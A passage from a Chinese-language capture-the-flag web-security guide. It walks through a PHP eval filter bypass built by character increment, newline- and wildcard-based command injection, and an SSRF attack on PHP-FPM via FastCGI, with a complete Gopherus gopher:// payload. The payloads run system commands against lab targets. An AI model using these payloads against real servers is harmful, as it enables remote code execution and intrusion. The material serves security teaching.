<!-- Imported from D:\\Book\\Web\\Chapter6\6-3.md -->
<h3 id="_6">自增代替关键字绕过<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16dd4d0e0a243d4ffc11f.jpg"></p>
<p>打开网页拿到源代码，首先是 POST 参数 code 长度不能超过 105</p>
<p>其次是不包含字母、数字、特殊字符，最后通过 eval() 执行</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16dddd0e0a243d4ffc121.jpg"></p>
<p>遍历正则发现 !$'()+,./;=[]_ 没有过滤</p>
<p>NaN 表示未定义或不可表示的值，可以用 (0/0) 表示</p>
<p>因为过滤了数字，所以这里用 _ 代替，得到 float(NAN)</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16e2dd0e0a243d4ffc128.jpg"></p>
<p>我们需要字符串类型的 NaN，加上 ._ 拼接转为字符串</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16ea6d0e0a243d4ffc133.jpg"></p>
<p>再通过数组下标提取出字符 N</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16ebbd0e0a243d4ffc136.jpg"></p>
<p>拿到字符 N 后通过自增的形式拿到其他字符</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16eded0e0a243d4ffc13e.jpg"></p>
<p>整体脚本如下</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="nv">$_</span><span class="o">=</span><span class="p">(</span><span class="nx">_</span><span class="o">/</span><span class="nx">_</span><span class="o">.</span><span class="nx">_</span><span class="p">)[</span><span class="nx">_</span><span class="p">];</span>
<a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="c1">//var_dump($_);  //"N"</span>
<a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>       <span class="c1">//"O"</span>
<a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="c1">//var_dump($_++);</span>
<a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="o">.</span><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>   <span class="c1">//"PO"</span>
<a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>         <span class="c1">//"Q"</span>
<a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a><span class="c1">//var_dump($_++);</span>
<a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>         <span class="c1">//"R"</span>
<a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>         <span class="c1">//"S"</span>
<a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a><span class="c1">//var_dump($_++);</span>
<a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a><span class="nv">$__</span><span class="o">=</span><span class="nv">$__</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span>  <span class="c1">//"POS"</span>
<a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a><span class="c1">//var_dump($__);</span>
<a id="__codelineno-59-14" name="__codelineno-59-14" href="#__codelineno-59-14"></a><span class="nv">$_</span><span class="o">++</span><span class="p">;</span>        <span class="c1">//"T"</span>
<a id="__codelineno-59-15" name="__codelineno-59-15" href="#__codelineno-59-15"></a><span class="c1">//var_dump($_++);</span>
<a id="__codelineno-59-16" name="__codelineno-59-16" href="#__codelineno-59-16"></a><span class="nv">$__</span><span class="o">=</span><span class="nv">$__</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span>  <span class="c1">//"POST"</span>
<a id="__codelineno-59-17" name="__codelineno-59-17" href="#__codelineno-59-17"></a><span class="c1">//var_dump($__);</span>
<a id="__codelineno-59-18" name="__codelineno-59-18" href="#__codelineno-59-18"></a><span class="nv">$_</span><span class="o">=</span><span class="nx">_</span><span class="o">.</span><span class="nv">$__</span><span class="p">;</span>    <span class="c1">//_POST</span>
<a id="__codelineno-59-19" name="__codelineno-59-19" href="#__codelineno-59-19"></a><span class="c1">//var_dump($_);</span>
<a id="__codelineno-59-20" name="__codelineno-59-20" href="#__codelineno-59-20"></a><span class="nv">$$_</span><span class="p">[</span><span class="nx">_</span><span class="p">](</span><span class="nv">$$_</span><span class="p">[</span><span class="nx">__</span><span class="p">]);</span>
<a id="__codelineno-59-21" name="__codelineno-59-21" href="#__codelineno-59-21"></a><span class="c1">//&amp;_=system&amp;__=cat /flag</span>
<a id="__codelineno-59-22" name="__codelineno-59-22" href="#__codelineno-59-22"></a>
<a id="__codelineno-59-23" name="__codelineno-59-23" href="#__codelineno-59-23"></a><span class="c1">//code=$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$__=$__.$_;$_++;$__=$__.$_;$_=_.$__;$$_[_]($$_[__]);&amp;_=system&amp;__=whoami</span>
</code></pre></div>
<p>成功拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b16f3cd0e0a243d4ffc148.jpg"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-30.md -->
<h3 id="_7">; 代替 &amp; 与 | 绕过<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cb9f558cb8da5c8c87356.png"></p>
<p>过滤了 <code>|</code> 与 <code>&amp;</code> ，那我们就使用 <code>;</code> 分隔命令来代替</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cba2658cb8da5c8c8735e.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-31.md -->
<h3 id="_8">* 代替部分关键字绕过<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbb6d58cb8da5c8c8741d.png"></p>
<p>查看 flag_is_here 文件夹下的文件</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1"># %0a - URL 编码的换行符（LF，ASCII 0x0A）</span>
<a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="c1"># 在命令行中，换行符可以用于分隔命令，可能用于注入额外命令</span>
<a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a><span class="c1"># %09 - URL 编码的水平制表符（TAB，ASCII 0x09）</span>
<a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a><span class="c1"># * 匹配任意字符</span>
<a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a><span class="m">127</span>.0.0.1%0als%09*is_here
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbc5058cb8da5c8c8747c.png"></p>
<p>拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="m">127</span>.0.0.1%0acd%09*_is_here%0aca%5ct%09*_100171326731527.php
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbc9058cb8da5c8c8747f.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-32.md -->
<h3 id="0a">%0a 代替 ; 绕过<a class="headerlink" href="#0a" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbb6d58cb8da5c8c8741d.png"></p>
<p>查看 flag_is_here 文件夹下的文件</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># %0a - URL 编码的换行符（LF，ASCII 0x0A）</span>
<a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="c1"># 在命令行中，换行符可以用于分隔命令，可能用于注入额外命令</span>
<a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="c1"># %09 - URL 编码的水平制表符（TAB，ASCII 0x09）</span>
<a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="c1"># * 匹配任意字符</span>
<a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="m">127</span>.0.0.1%0als%09*is_here
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbc5058cb8da5c8c8747c.png"></p>
<p>拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="m">127</span>.0.0.1%0acd%09*_is_here%0aca%5ct%09*_100171326731527.php
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cbc9058cb8da5c8c8747f.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-33.md -->
<h3 id="ssrf-fastcgi-rce">SSRF FastCGI 协议 RCE<a class="headerlink" href="#ssrf-fastcgi-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f45ee58cb8da5c8cb212f.png"></p>
<p><strong>1️⃣ FastCGI 简介</strong></p>
<p>FastCGI 是一种通用网关接口（CGI）的改进版本，旨在解决传统 CGI 存在的性能问题</p>
<p>传统  CGI  每次请求都会创建一个新的进程，处理完请求后销毁，极大浪费系统资源</p>
<p>而 FastCGI 通过长连接与进程复用机制，显著提高了性能</p>
<p>FastCGI 通常用于：</p>
<ul>
<li>Web 服务器（如 Nginx、Apache）与后端应用（如 PHP-FPM）之间的通信</li>
<li>保持后端服务进程常驻，提高高并发下的性能</li>
</ul>
<p><strong>2️⃣ FastCGI 架构概览</strong></p>
<p>通信双方：</p>
<ul>
<li>Web 服务器：客户端请求入口，如 Nginx</li>
<li>FastCGI 应用程序：通常是 PHP-FPM 或其他应用服务器</li>
</ul>
<p>工作流程：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="o">[</span><span class="nt">客户端浏览器</span><span class="o">]</span><span class="w"> </span>
<a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="w">     </span><span class="err">↓</span>
<a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="o">[</span><span class="nt">Web</span><span class="w"> </span><span class="nt">服务器</span><span class="w"> </span><span class="o">(</span><span class="nt">如</span><span class="w"> </span><span class="nt">Nginx</span><span class="o">)]</span><span class="w">  </span><span class="err">——</span><span class="nt">TCP</span><span class="o">/</span><span class="nt">Unix</span><span class="w"> </span><span class="nt">Socket</span><span class="err">——</span><span class="o">&gt;</span><span class="w">  </span><span class="o">[</span><span class="nt">FastCGI</span><span class="w"> </span><span class="nt">后端</span><span class="w"> </span><span class="o">(</span><span class="nt">如</span><span class="w"> </span><span class="nt">PHP-FPM</span><span class="o">)]</span>
</code></pre></div>
<ul>
<li>Web 服务器把请求封装成 FastCGI 协议格式，通过 Socket 发给 FastCGI 进程</li>
<li>FastCGI 进程解析请求，执行后端逻辑，返回响应数据</li>
<li>Web 服务器再将结果返还给客户端</li>
</ul>
<p><strong>3️⃣ FastCGI 协议结构</strong></p>
<p>数据传输的基本单位：Record（记录）</p>
<p>每个 Record 有固定头部格式和可变长度的数据部分。</p>
<p>Record Header（8 字节）结构：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>大小（字节）</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Version</td>
<td>1</td>
<td>FastCGI 版本，通常是 <code>1</code></td>
</tr>
<tr>
<td>Type</td>
<td>1</td>
<td>记录类型（见下表）</td>
</tr>
<tr>
<td>RequestId</td>
<td>2</td>
<td>请求 ID（用于多路复用）</td>
</tr>
<tr>
<td>ContentLength</td>
<td>2</td>
<td>内容长度</td>
</tr>
<tr>
<td>PaddingLength</td>
<td>1</td>
<td>填充字节长度（用于对齐）</td>
</tr>
<tr>
<td>Reserved</td>
<td>1</td>
<td>保留，通常为 <code>0</code></td>
</tr>
</tbody>
</table>
<p>常见 Type 类型：</p>
<table>
<thead>
<tr>
<th>类型名</th>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>FCGI_BEGIN_REQUEST</td>
<td>1</td>
<td>表示开始一个请求</td>
</tr>
<tr>
<td>FCGI_ABORT_REQUEST</td>
<td>2</td>
<td>表示中断请求</td>
</tr>
<tr>
<td>FCGI_END_REQUEST</td>
<td>3</td>
<td>表示请求结束</td>
</tr>
<tr>
<td>FCGI_PARAMS</td>
<td>4</td>
<td>发送请求的环境变量</td>
</tr>
<tr>
<td>FCGI_STDIN</td>
<td>5</td>
<td>发送请求主体（如 POST 数据）</td>
</tr>
<tr>
<td>FCGI_STDOUT</td>
<td>6</td>
<td>标准输出（返回内容）</td>
</tr>
<tr>
<td>FCGI_STDERR</td>
<td>7</td>
<td>标准错误（返回错误信息）</td>
</tr>
<tr>
<td>FCGI_DATA</td>
<td>8</td>
<td>补充数据（很少用）</td>
</tr>
</tbody>
</table>
<p><strong>4️⃣ 通信过程详细步骤</strong></p>
<p>一次 HTTP 请求通常包含以下 FastCGI Record：</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>①<span class="w"> </span>FCGI_BEGIN_REQUEST<span class="w">        </span><span class="c1"># 开始请求</span>
<a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>②<span class="w"> </span>FCGI_PARAMS<span class="w"> </span><span class="o">(</span>多次<span class="o">)</span><span class="w">         </span><span class="c1"># 环境变量（如 PATH_INFO、QUERY_STRING 等）</span>
<a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a>③<span class="w"> </span>FCGI_PARAMS<span class="w"> </span><span class="o">(</span>空<span class="o">)</span><span class="w">           </span><span class="c1"># 空表示结束</span>
<a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a>④<span class="w"> </span>FCGI_STDIN<span class="w"> </span><span class="o">(</span>可能多次<span class="o">)</span><span class="w">      </span><span class="c1"># 请求体，如 POST 数据</span>
<a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a>⑤<span class="w"> </span>FCGI_STDIN<span class="w"> </span><span class="o">(</span>空<span class="o">)</span><span class="w">            </span><span class="c1"># 空表示结束</span>
<a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a>----------------------------
<a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a>⑥<span class="w"> </span>FCGI_STDOUT<span class="w"> </span><span class="o">(</span>返回内容<span class="o">)</span>
<a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a>⑦<span class="w"> </span>FCGI_STDERR<span class="w"> </span><span class="o">(</span>错误信息<span class="o">)</span>
<a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a>⑧<span class="w"> </span>FCGI_END_REQUEST<span class="w">           </span><span class="c1"># 通知请求结束</span>
</code></pre></div>
<p><strong>5️⃣ 请求示例（伪过程）</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="err">客户端发起 HTTP 请求：GET /index.php?id=1</span>
<a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>
<a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="err">Nginx 生成 FastCGI 请求：</span>
<a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a><span class="err">1️⃣ 发送 BEGIN_REQUEST</span>
<a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="err">2️⃣ 发送 PARAMS（SCRIPT_FILENAME, QUERY_STRING 等）</span>
<a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a><span class="err">3️⃣ 发送空 PARAMS</span>
<a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="err">4️⃣ （GET 没有 STDIN）</span>
<a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a><span class="err">5️⃣ 等待 FastCGI 返回数据</span>
</code></pre></div>
<p>FastCGI 返回：</p>
<ul>
<li>STDOUT: 输出 HTML 内容</li>
<li>STDERR: 错误日志（如果有）</li>
<li>END_REQUEST: 请求结束</li>
</ul>
<p><strong>6️⃣ PHP-FPM 简介</strong></p>
<p>PHP-FPM 是专门为 <strong>PHP 提供更高效、更稳定的进程管理机制的 FastCGI 实现</strong>，常用于配合 Nginx 部署 PHP 网站</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>浏览器请求 --&gt; Nginx --&gt; PHP-FPM --&gt; PHP 脚本执行 --&gt; 返回结果
</code></pre></div>
<p><strong>7️⃣攻击原理</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a><span class="o">+----------------------+</span>
<a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a><span class="o">|</span><span class="w">   </span><span class="err">攻击者发起请求</span><span class="w">     </span><span class="o">|</span>
<a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a><span class="o">+----------------------+</span>
<a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a><span class="w">            </span><span class="o">|</span>
<a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a><span class="w">            </span><span class="nv">v</span>
<a id="__codelineno-68-6" name="__codelineno-68-6" href="#__codelineno-68-6"></a><span class="o">+----------------------------------+</span>
<a id="__codelineno-68-7" name="__codelineno-68-7" href="#__codelineno-68-7"></a><span class="o">|</span><span class="w"> </span><span class="nv">PHP</span><span class="o">-</span><span class="nv">FPM</span><span class="w"> </span><span class="err">端口</span><span class="w"> </span><span class="mi">9000</span><span class="w"> </span><span class="err">是否暴露公网？</span><span class="w">    </span><span class="o">|</span>
<a id="__codelineno-68-8" name="__codelineno-68-8" href="#__codelineno-68-8"></a><span class="o">+----------------------------------+</span>
<a id="__codelineno-68-9" name="__codelineno-68-9" href="#__codelineno-68-9"></a><span class="w">      </span><span class="o">|</span><span class="w">                      </span><span class="o">|</span>
<a id="__codelineno-68-10" name="__codelineno-68-10" href="#__codelineno-68-10"></a><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="err">是</span><span class="w">                   </span><span class="o">|</span><span class="w"> </span><span class="err">否</span>
<a id="__codelineno-68-11" name="__codelineno-68-11" href="#__codelineno-68-11"></a><span class="w">      </span><span class="nv">v</span><span class="w">                      </span><span class="nv">v</span>
<a id="__codelineno-68-12" name="__codelineno-68-12" href="#__codelineno-68-12"></a><span class="o">+------------------+</span><span class="w">   </span><span class="o">+-------------------+</span>
<a id="__codelineno-68-13" name="__codelineno-68-13" href="#__codelineno-68-13"></a><span class="o">|</span><span class="w">  </span><span class="err">直接构造</span><span class="w"> </span><span class="nv">FastCGI</span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">  </span><span class="nv">SSRF</span><span class="w"> </span><span class="err">访问</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="o">|</span>
<a id="__codelineno-68-14" name="__codelineno-68-14" href="#__codelineno-68-14"></a><span class="o">|</span><span class="w">   </span><span class="err">数据包攻击</span><span class="nv">FPM</span><span class="w">  </span><span class="o">|</span><span class="w">   </span><span class="o">|</span><span class="w">   </span><span class="err">请求</span><span class="w"> </span><span class="nv">FastCGI</span><span class="w"> </span><span class="err">端口</span><span class="w">  </span><span class="o">|</span>
<a id="__codelineno-68-15" name="__codelineno-68-15" href="#__codelineno-68-15"></a><span class="o">+------------------+</span><span class="w">   </span><span class="o">+-------------------+</span>
<a id="__codelineno-68-16" name="__codelineno-68-16" href="#__codelineno-68-16"></a><span class="w">      </span><span class="o">|</span><span class="w">                      </span><span class="o">|</span>
<a id="__codelineno-68-17" name="__codelineno-68-17" href="#__codelineno-68-17"></a><span class="w">      </span><span class="o">+----------+-----------+</span>
<a id="__codelineno-68-18" name="__codelineno-68-18" href="#__codelineno-68-18"></a><span class="w">                 </span><span class="nv">v</span>
<a id="__codelineno-68-19" name="__codelineno-68-19" href="#__codelineno-68-19"></a><span class="w">       </span><span class="o">+----------------------------+</span>
<a id="__codelineno-68-20" name="__codelineno-68-20" href="#__codelineno-68-20"></a><span class="w">       </span><span class="o">|</span><span class="w">   </span><span class="nv">SCRIPT_FILENAME</span><span class="w"> </span><span class="err">参数控制</span><span class="w">  </span><span class="o">|</span>
<a id="__codelineno-68-21" name="__codelineno-68-21" href="#__codelineno-68-21"></a><span class="w">       </span><span class="o">+----------------------------+</span>
<a id="__codelineno-68-22" name="__codelineno-68-22" href="#__codelineno-68-22"></a><span class="w">                 </span><span class="o">|</span>
<a id="__codelineno-68-23" name="__codelineno-68-23" href="#__codelineno-68-23"></a><span class="w">     </span><span class="o">+-----------------------------+</span>
<a id="__codelineno-68-24" name="__codelineno-68-24" href="#__codelineno-68-24"></a><span class="w">     </span><span class="o">|</span><span class="w">  </span><span class="err">文件后缀是否受限制？</span><span class="w">        </span><span class="o">|</span>
<a id="__codelineno-68-25" name="__codelineno-68-25" href="#__codelineno-68-25"></a><span class="w">     </span><span class="o">+-----------------------------+</span>
<a id="__codelineno-68-26" name="__codelineno-68-26" href="#__codelineno-68-26"></a><span class="w">         </span><span class="o">|</span><span class="w">                    </span><span class="o">|</span>
<a id="__codelineno-68-27" name="__codelineno-68-27" href="#__codelineno-68-27"></a><span class="w">         </span><span class="o">|</span><span class="w"> </span><span class="err">老版本，不受限</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="err">新版本，仅限</span><span class="w"> </span><span class="p">.</span><span class="nv">php</span>
<a id="__codelineno-68-28" name="__codelineno-68-28" href="#__codelineno-68-28"></a><span class="w">         </span><span class="nv">v</span><span class="w">                    </span><span class="nv">v</span>
<a id="__codelineno-68-29" name="__codelineno-68-29" href="#__codelineno-68-29"></a><span class="o">+----------------+</span><span class="w">     </span><span class="o">+---------------------+</span>
<a id="__codelineno-68-30" name="__codelineno-68-30" href="#__codelineno-68-30"></a><span class="o">|</span><span class="w"> </span><span class="err">任意文件可利用</span><span class="w"> </span><span class="o">|</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="err">只能利用已有</span><span class="w"> </span><span class="p">.</span><span class="nv">php</span><span class="w"> </span><span class="err">文件</span><span class="w"> </span><span class="o">|</span>
<a id="__codelineno-68-31" name="__codelineno-68-31" href="#__codelineno-68-31"></a><span class="o">+----------------+</span><span class="w">     </span><span class="o">+---------------------+</span>
<a id="__codelineno-68-32" name="__codelineno-68-32" href="#__codelineno-68-32"></a><span class="w">         </span><span class="o">|</span><span class="w">                    </span><span class="o">|</span>
<a id="__codelineno-68-33" name="__codelineno-68-33" href="#__codelineno-68-33"></a><span class="w">         </span><span class="nv">v</span><span class="w">                    </span><span class="nv">v</span>
<a id="__codelineno-68-34" name="__codelineno-68-34" href="#__codelineno-68-34"></a><span class="o">+--------------------+</span><span class="w">  </span><span class="o">+----------------------+</span>
<a id="__codelineno-68-35" name="__codelineno-68-35" href="#__codelineno-68-35"></a><span class="o">|</span><span class="w"> </span><span class="err">可读取</span><span class="w"> </span><span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span><span class="w"> </span><span class="o">|</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="err">执行指定</span><span class="w"> </span><span class="nv">PHP</span><span class="w"> </span><span class="err">脚本，</span><span class="w">      </span><span class="o">|</span>
<a id="__codelineno-68-36" name="__codelineno-68-36" href="#__codelineno-68-36"></a><span class="o">|</span><span class="w"> </span><span class="err">或其他任意文件</span><span class="w">     </span><span class="o">|</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="err">达成远程代码执行</span><span class="w">       </span><span class="o">|</span>
<a id="__codelineno-68-37" name="__codelineno-68-37" href="#__codelineno-68-37"></a><span class="o">+--------------------+</span><span class="w">  </span><span class="o">+----------------------+</span>
</code></pre></div>
<p>本文要利用一个脚本 <a href="https://github.com/tarunkant/Gopherus/tree/master">gopherus.py</a>，这个脚本可以对 SSRF 漏洞进行利用，可以直接生成 payload 造成远程代码执行 RCE</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Gopherus<span class="o">]</span>
<a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>└─$<span class="w"> </span>python2<span class="w"> </span>gopherus.py<span class="w"> </span>-h<span class="w">                                                             </span>
<a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>usage:<span class="w"> </span>gopherus.py<span class="w"> </span><span class="o">[</span>-h<span class="o">]</span><span class="w"> </span><span class="o">[</span>--exploit<span class="w"> </span>EXPLOIT<span class="o">]</span>
<a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>
<a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>optional<span class="w"> </span>arguments:
<a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="w">  </span>-h,<span class="w"> </span>--help<span class="w">         </span>show<span class="w"> </span>this<span class="w"> </span><span class="nb">help</span><span class="w"> </span>message<span class="w"> </span>and<span class="w"> </span><span class="nb">exit</span>
<a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="w">  </span>--exploit<span class="w"> </span>EXPLOIT<span class="w">  </span>mysql,<span class="w"> </span>postgresql,<span class="w"> </span>fastcgi,<span class="w"> </span>redis,<span class="w"> </span>smtp,<span class="w"> </span>zabbix,
<a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="w">                     </span>pymemcache,<span class="w"> </span>rbmemcache,<span class="w"> </span>phpmemcache,<span class="w"> </span>dmpmemcache
</code></pre></div>
<p>我们选择 fastcgi 的</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>python2<span class="w"> </span>gopherus.py<span class="w"> </span>--exploit<span class="w"> </span>fastcgi
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f54a658cb8da5c8cb5640.png"></p>
<p>然后输入 <code>/var/www/index.php</code>，运行一下 ls</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f55a658cb8da5c8cb579a.png"></p>
<p>得到 payload</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f55c758cb8da5c8cb57bf.png"></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="err">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span>
</code></pre></div>
<p>再做一次 URL 编码（因为走的是 <code>?url</code>）</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="err">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span>
</code></pre></div>
<p>可以看到有个 <code>index.php</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f5ca658cb8da5c8cb5fee.png"></p>
<p>重新跑一下脚本拿 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687f5d1e58cb8da5c8cb6017.png"></p>
<p>成功拿到 flag</p>
